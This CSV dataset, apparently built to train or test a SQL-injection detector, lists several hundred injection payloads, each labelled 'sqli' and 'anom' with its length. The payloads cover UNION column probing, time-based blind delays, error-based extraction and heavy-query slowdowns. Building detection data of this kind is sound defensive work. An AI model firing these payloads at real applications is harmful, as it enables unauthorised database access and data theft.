Query,Length,Attack,Label
"1%""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",215,sqli,anom
"1%')));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",97,sqli,anom
"1%"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",91,sqli,anom
"1 or 8514=benchmark(5000000,md5(0x544d5a4c))#",45,sqli,anom
1') and 7290=8416 and ('ktlz' like 'ktlz,40,sqli,anom
1%' or 4240=(select 4240 from pg_sleep(5))--,44,sqli,anom
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",99,sqli,anom
"-7940%"") union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",76,sqli,anom
"-1692') union all select 7074,7074,7074,7074,7074,7074,7074#",60,sqli,anom
-5116) or (8287=4930)*4930,26,sqli,anom
"1"")) as ubrg where 7318=7318 and 7331=6529--",44,sqli,anom
"-5539"") union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",71,sqli,anom
"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""%""=""",102,sqli,anom
"1) as hvsk where 7902=7902;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",123,sqli,anom
1') as jlae where 1650=1650;begin user_lock.sleep(5); end--,59,sqli,anom
-3859) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (5846=5846,207,sqli,anom
"1%""))) union all select null,null,null,null,null,null,null,null,null--",70,sqli,anom
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",189,sqli,anom
"1)) as xroy where 3274=3274;iif(3760=4785,1,1/0)",48,sqli,anom
"1%"";begin user_lock.sleep(5); end and ""%""=""",43,sqli,anom
"1'||(select 'mzsy' where 4940=4940 or elt(5873=5873,sleep(5))#",62,sqli,anom
"iif(2976=2976,1,1/0)",20,sqli,anom
"1' union all select null,null,null#",35,sqli,anom
"1',(select 6825 from(select count(*),concat(0x7171706a71,(select (elt(6825=6825,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",169,sqli,anom
"1' union all select null,null,null,null,null--",46,sqli,anom
"1"");(select * from (select(sleep(5)))acdk)#",43,sqli,anom
"1))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",80,sqli,anom
"-1204')) union all select 3585,3585--",37,sqli,anom
"1"") and (3020=3020)*6703 and (""qowc"" like ""qowc",47,sqli,anom
"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",65,sqli,anom
"1') where 5925=5925 union all select null,null,null,null,null,null,null#",72,sqli,anom
"-2248'+(select wuow where 4421=4421 union all select 4421,4421,4421,4421,4421,4421--",84,sqli,anom
1;waitfor delay '0:0:5',23,sqli,anom
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'lxqz'='lxqz",174,sqli,anom
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",69,sqli,anom
"1' or 8156=(select count(*) from generate_series(1,5000000))--",62,sqli,anom
"1')));select count(*) from generate_series(1,5000000) and ((('wvzw'='wvzw",73,sqli,anom
"1'+(select hspl where 4530=4530 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",130,sqli,anom
"1');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('crkz'='crkz",116,sqli,anom
"-1270'||(select 'mgdi' where 6785=6785 union all select 6785,6785#",66,sqli,anom
1')));select pg_sleep(5)--,26,sqli,anom
"1 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)-- pvdw",82,sqli,anom
"1'+(select 'qzcx' where 9524=9524 and elt(3069=8430,8430))+'",60,sqli,anom
"1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",144,sqli,anom
"1%""))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",80,sqli,anom
"-7776') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('ihof'='ihof",220,sqli,anom
"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",90,sqli,anom
1')) as pdcl where 6964=6964;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,112,sqli,anom
"-5317')) union all select 7673,7673,7673,7673,7673,7673#",56,sqli,anom
"1%""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",97,sqli,anom
"1'))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",157,sqli,anom
"1'))) union all select null,null,null,null,null,null,null,null,null,null#",73,sqli,anom
"1')) and elt(6847=5874,5874) and (('yspu'='yspu",47,sqli,anom
1%') and (7704=3494)*3494 and ('%'=',36,sqli,anom
-7663')) or 1558=1104 and (('wsrq'='wsrq,40,sqli,anom
"-9996' or make_set(1237=7111,7111)",34,sqli,anom
"1""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""pnsz"" like ""pnsz",74,sqli,anom
"-6453"")) as hehs where 9363=9363 union all select 9363,9363,9363,9363,9363,9363,9363,9363,9363#",95,sqli,anom
"-5728) where 8663=8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",90,sqli,anom
1' and 7533=7533 and 'clqy' like 'clqy,38,sqli,anom
"1%') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('%'='",111,sqli,anom
"1))) union all select null,null,null,null,null,null,null,null,null#",67,sqli,anom
1' where 4473=4473 and (select * from (select(sleep(5)))gcrr)#,62,sqli,anom
"1%"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""%""=""",105,sqli,anom
"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",63,sqli,anom
"1%"" and 3824=benchmark(5000000,md5(0x76555642)) and ""%""=""",57,sqli,anom
"-6118 union all select 5906,5906,5906,5906,5906#",48,sqli,anom
1) as pqle where 4039=4039 and 7533=7533--,42,sqli,anom
"-9265"") or 7834=1685",20,sqli,anom
"1') and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",102,sqli,anom
"1)) as wajy where 8593=8593;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",95,sqli,anom
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",110,sqli,anom
"-2424) where 8132=8132 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",219,sqli,anom
"1)) and elt(9288=6067,6067) and ((1895=1895",43,sqli,anom
-3666') where 6386=6386 union all select 6386--,47,sqli,anom
1'||(select 'ylio' from dual where 3767=3767 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||',229,sqli,anom
"-7184) as fshx where 3408=3408 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",227,sqli,anom
"1"" and make_set(8403=8403,8899) and ""bbgg""=""bbgg",48,sqli,anom
"1%"") and elt(7436=9874,9874) and (""%""=""",39,sqli,anom
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""rugr""=""rugr",85,sqli,anom
"-8178) union all select 4163,4163,4163,4163,4163,4163,4163--",60,sqli,anom
1) as jtfx where 8038=8038;select sleep(5)--,44,sqli,anom
1')));begin user_lock.sleep(5); end and ((('gqhc'='gqhc,55,sqli,anom
"-9840)) as thod where 4790=4790 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",228,sqli,anom
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))",60,sqli,anom
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",100,sqli,anom
"1 where 6044=6044 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",174,sqli,anom
"1'));select count(*) from generate_series(1,5000000) and (('wmoo' like 'wmoo",76,sqli,anom
1' where 7191=7191 rlike sleep(5)--,35,sqli,anom
"1)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",199,sqli,anom
"-6642') where 3459=3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#",86,sqli,anom
"-1859' union all select 1781,1781,1781,1781#",44,sqli,anom
"-7016%"")) union all select 8847,8847,8847--",43,sqli,anom
"(select (case when (1343=1343) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1343 end) from dual)",149,sqli,anom
1')));select case when 2948=7279 then 1 else null end--,55,sqli,anom
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",88,sqli,anom
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),205,sqli,anom
"1"") and 7533=7533 and (""jfsw"" like ""jfsw",40,sqli,anom
"1%"";select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",88,sqli,anom
1') and 5999=5879,17,sqli,anom
"-4413%')) union all select 1345,1345#",37,sqli,anom
"-6388'+(select 'jqld' where 8600=8600 union all select 8600,8600#",65,sqli,anom
"1%"")));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",115,sqli,anom
"1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('tpcm' like 'tpcm",178,sqli,anom
"-2453"") union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",76,sqli,anom
1');(select * from (select(sleep(5)))srmq) and ('kerg' like 'kerg,65,sqli,anom
-7103)) or 4610=1871 and ((1249=1249,36,sqli,anom
"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",59,sqli,anom
"1' where 8451=8451 union all select null,null,null,null,null,null,null,null,null#",81,sqli,anom
-4410 where 5749=5749 or 1317=9823--,36,sqli,anom
"1"")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""yrgy"" like ""yrgy",89,sqli,anom
"-8129'))) union all select 4531,4531,4531#",42,sqli,anom
1')));select case when 3819=1887 then 1 else null end--,55,sqli,anom
"-1490'||(select 'uzbm' from dual where 3181=3181 union all select 3181,3181,3181,3181,3181--",92,sqli,anom
"1')));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",90,sqli,anom
1')) and sleep(5) and (('jiio' like 'jiio,41,sqli,anom
-8513) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (5818=5818,219,sqli,anom
-7378' or 6872=6872 and 'bnmn' like 'bnmn,41,sqli,anom
"1%') and make_set(8403=8403,8899) and ('%'='",44,sqli,anom
"1"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",203,sqli,anom
"1'+(select 'ixza' where 4374=4374 union all select null,null,null--",67,sqli,anom
"1' in boolean mode) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
"-3347'+(select xuzs where 1076=1076 union all select 1076,1076,1076,1076,1076--",79,sqli,anom
1'+(select qsmo where 3172=3172;select (case when (4780=4432) then 4780 else 4780*(select 4780 from mysql.db) end)#,115,sqli,anom
"-5082)) union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",75,sqli,anom
"1' in boolean mode) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)#",150,sqli,anom
"1"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""hybu"" like ""hybu",228,sqli,anom
"1') as hvyx where 3194=3194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",168,sqli,anom
"1';select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",87,sqli,anom
"-7518"" or elt(8413=3995,3995) and ""cpnf""=""cpnf",46,sqli,anom
"-9175')) union all select 6174,6174,6174,6174--",47,sqli,anom
"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'lwir' like 'lwir",130,sqli,anom
1'+(select ijoh where 7145=7145 order by 1--,44,sqli,anom
1'||(select 'bupa' from dual where 8548=8548;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,138,sqli,anom
"1)))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((3023=3023",207,sqli,anom
-9389') or 8859=3989--,22,sqli,anom
1'||(select 'bezt' where 7876=7876;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,118,sqli,anom
1)) or sleep(5)#,16,sqli,anom
1')) as rxxd where 5049=5049;select pg_sleep(5)--,49,sqli,anom
-6081 where 3681=3681 or 2603=3138--,36,sqli,anom
1 where 4785=4785 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,222,sqli,anom
"1"") where 1212=1212 and 8475=5864",33,sqli,anom
"1"" where 3990=3990 and 8594=(select 8594 from pg_sleep(5))--",60,sqli,anom
"1) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (1624=1624",107,sqli,anom
1;select (case when (7254=5901) then 1 else 7254*(select 7254 from master..sysdatabases) end)--,95,sqli,anom
"-3071)) as uiiu where 8910=8910 union all select 8910,8910,8910,8910,8910,8910,8910#",84,sqli,anom
"-6928"")) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""mxhr"" like ""mxhr",218,sqli,anom
1')) and sleep(5) and (('tcwt'='tcwt,36,sqli,anom
1') or (select * from (select(sleep(5)))ydpu) and ('zaes'='zaes,63,sqli,anom
"1) as nmlm where 9872=9872;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",87,sqli,anom
"1' where 6902=6902 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",216,sqli,anom
"1) and elt(7425=8842,8842) and (9194=9194",41,sqli,anom
"1%')) union all select null,null,null,null,null,null,null--",59,sqli,anom
1') rlike (select (case when (7447=3981) then 1 else 0x28 end)),63,sqli,anom
"1%"") rlike (select * from (select(sleep(5)))sgvo) and (""%""=""",60,sqli,anom
"-3865') union all select 4935,4935,4935,4935,4935--",51,sqli,anom
"1"")) waitfor delay '0:0:5' and ((""witb""=""witb",45,sqli,anom
"1%') union all select null,null,null#",37,sqli,anom
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",92,sqli,anom
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((""ymss""=""ymss",111,sqli,anom
1)) as pmff where 6649=6649;begin user_lock.sleep(5); end--,59,sqli,anom
"-5761"") or 3762=1274",20,sqli,anom
"1) where 9829=9829 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",156,sqli,anom
"-7347"")) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",71,sqli,anom
1')) rlike (select * from (select(sleep(5)))sgvo) and (('hqcz'='hqcz,68,sqli,anom
"1""))) and 2006=2006",19,sqli,anom
"1' in boolean mode);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual#",102,sqli,anom
"1%"" union all select null#",26,sqli,anom
1) where 8320=8320 waitfor delay '0:0:5'--,42,sqli,anom
"1' in boolean mode) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",157,sqli,anom
-3520%' or 8571=8571--,22,sqli,anom
"1"")) as femc where 1313=1313 and 4595=4595#",43,sqli,anom
"-1583') or elt(1032=1032,3623) and ('jrcj' like 'jrcj",53,sqli,anom
"1) where 8302=8302 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",94,sqli,anom
"1%')) union all select null,null,null,null,null,null,null,null--",64,sqli,anom
"1"") rlike (select * from (select(sleep(5)))sgvo) and (""fkmh""=""fkmh",66,sqli,anom
"1');iif(1157=4542,1,1/0)",24,sqli,anom
"1"" order by 1#",14,sqli,anom
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'ymnm'='ymnm,218,sqli,anom
"1"")) as rcse where 4559=4559 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",120,sqli,anom
"1"") as sstd where 9629=9629 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",120,sqli,anom
-1432 order by 1#,17,sqli,anom
-9721') or 9287=4362#,21,sqli,anom
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'bpbe' like 'bpbe",163,sqli,anom
1) where 2734=2734 waitfor delay '0:0:5'--,42,sqli,anom
"1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('narn'='narn",175,sqli,anom
"1'))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",112,sqli,anom
-2793') where 2621=2621 union all select 2621#,46,sqli,anom
"1)) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((3003=3003",169,sqli,anom
"1)) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((5200=5200",170,sqli,anom
-5585%'))) or 6990=7727,23,sqli,anom
"1"" and 6637=2321",16,sqli,anom
"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",61,sqli,anom
"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (5621=5621",121,sqli,anom
"1)) as hqwy where 4433=4433 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",131,sqli,anom
1'||(select 'mlwj' from dual where 4247=4247 and 1702=8469)||',62,sqli,anom
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",85,sqli,anom
1');(select * from (select(sleep(5)))srmq) and ('pgth'='pgth,60,sqli,anom
"1 where 4331=4331 union all select null,null,null,null,null,null#",65,sqli,anom
"1"" where 1809=1809 and make_set(8403=8403,8899)--",49,sqli,anom
"1)) as npdl where 5796=5796 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",130,sqli,anom
"1'))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",101,sqli,anom
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",109,sqli,anom
1 where 5700=5700;select pg_sleep(5)--,38,sqli,anom
"-8777"") as lalf where 8606=8606 or elt(4397=5823,5823)--",56,sqli,anom
"1"") where 9962=9962 and 4595=4595#",34,sqli,anom
"1'+(select qdon where 9453=9453;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",133,sqli,anom
"1') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('bzgs' like 'bzgs",181,sqli,anom
1)) as pynj where 7683=7683 waitfor delay '0:0:5'--,51,sqli,anom
"-9937')) union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",71,sqli,anom
"1"")) as itxo where 7916=7916;select count(*) from generate_series(1,5000000)--",78,sqli,anom
"1"") where 6823=6823 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",161,sqli,anom
"1'+(select iaeu where 5509=5509 or 8514=benchmark(5000000,md5(0x544d5a4c))#",75,sqli,anom
"-6084')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('dfcp'='dfcp",222,sqli,anom
1')) or (select * from (select(sleep(5)))ydpu) and (('yqbo'='yqbo,65,sqli,anom
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)-- yekf",114,sqli,anom
"-4166%"") union all select 5190--",32,sqli,anom
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# lgoz",162,sqli,anom
"-4072%""))) or 3999=1979",23,sqli,anom
"-1763%"" or (8459=8459)*4906 and ""%""=""",37,sqli,anom
"1') as siyk where 1514=1514 union all select null,null,null,null,null,null#",75,sqli,anom
"1%"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""%""=""",85,sqli,anom
"1',row(7937,5067)>(select count(*),concat(0x7171706a71,(select (elt(7937=7937,1))),0x717a767a71,floor(rand(0)*2))x from (select 9974 union select 5497 union select 8209 union select 8147)a group by x)",200,sqli,anom
1'||(select 'owzs' where 1475=1475 union all select null--,58,sqli,anom
"1'||(select 'akye' where 9242=9242 union all select null,null,null,null,null,null#",82,sqli,anom
"1) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",78,sqli,anom
"1"") where 3321=3321;begin dbms_lock.sleep(5); end--",51,sqli,anom
"-6996%"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",138,sqli,anom
1))) and 6969=(select 6969 from pg_sleep(5)) and (((5333=5333,61,sqli,anom
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),189,sqli,anom
"1"") and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (""diiv""=""diiv",96,sqli,anom
"1"")) as xhat where 6674=6674 union all select null,null,null#",61,sqli,anom
"1') as rqzz where 4987=4987 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",133,sqli,anom
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",61,sqli,anom
"1%') or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,sqli,anom
"1' where 8430=8430 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",120,sqli,anom
"1' where 2774=2774 union all select null,null,null,null,null#",61,sqli,anom
"1%') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('%'='",119,sqli,anom
"1 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",109,sqli,anom
"1')) as bsvk where 5985=5985 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",120,sqli,anom
"-9837"" where 7201=7201 union all select 7201,7201,7201--",56,sqli,anom
"1'||(select 'scqw' where 3337=3337 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",110,sqli,anom
"1%"");select sleep(5) and (""%""=""",31,sqli,anom
1' and 7528=2894 and 'qoyw'='qoyw,33,sqli,anom
"1) where 4710=4710 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",150,sqli,anom
"-6890""))) union all select 1115#",32,sqli,anom
1));waitfor delay '0:0:5'--,27,sqli,anom
"-7111 union all select 2409,2409,2409,2409,2409,2409#",53,sqli,anom
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""soyg""=""soyg",109,sqli,anom
"1') as pghp where 9086=9086;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",112,sqli,anom
1') where 2330=2330 and (select * from (select(sleep(5)))fzno)--,64,sqli,anom
"1'+(select acax where 4169=4169 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",130,sqli,anom
1)) and 2006=2006,17,sqli,anom
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'gajm'='gajm",134,sqli,anom
1' where 6116=6116;select (case when (7033=1594) then 7033 else 7033*(select 7033 from information_schema.character_sets) end)#,127,sqli,anom
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",93,sqli,anom
"1%"")));select (case when (8857=1512) then 8857 else 8857*(select 8857 from mysql.db) end)#",90,sqli,anom
"1')) as jntr where 5051=5051 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",201,sqli,anom
